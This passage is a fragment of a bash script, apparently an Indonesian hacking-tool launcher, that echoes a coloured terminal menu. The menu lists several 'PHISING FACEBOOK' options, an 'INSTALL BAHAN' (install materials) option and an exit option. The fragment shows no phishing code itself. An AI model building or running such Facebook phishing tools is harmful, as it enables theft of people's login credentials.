...
echo $i"|"$me"16"$i" |"$cy" PHISING FACEBOOK 3       "$i"|"$i"    |"$cy" G"$i" |"
echo $i"|"$me"17"$i" |"$cy" PHISING FACEBOOK 4       "$i"|"$i"    |"$cy" R"$i" |"
echo $i"────────────────────────────────"$i"                |"$cy" E"$i" |"
echo $i"|"$me"18"$i" |"$cy" INSTALL BAHAN         "$i"|"$i"       |"$cy" A"$i" |"
echo $i"|"$me"19"$i" |"$cy" KELUAR/EXIT PROGRAM      "$i"|"$i"    |"$cy" T"$i" |"
echo $i"────────────────────────────────    ─────"
echo
